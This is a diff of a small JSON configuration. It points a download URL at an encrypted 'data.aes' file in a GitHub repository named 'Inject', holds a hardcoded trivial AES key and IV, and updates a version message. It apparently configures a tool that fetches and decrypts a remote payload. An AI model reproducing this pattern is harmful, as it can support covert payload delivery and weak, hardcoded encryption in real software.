@@ -1,7 +1,7 @@
 {
-  "download_url": "https://github.com/zxvaibhav/Inject/raw/refs/heads/main/da",
-  "aes_key": "1234567812345678",
+  "download_url": "https://github.com/zxvaibhav/Inject/raw/refs/heads/main/data.aes",
+  "aes_key": "1234567812345678", 
   "aes_iv": "1234567812345678",
   "version": "1.0",
-  "update_message": "Auto-detecting file type support added"
+  "update_message": "Auto-detect file type support"
 }
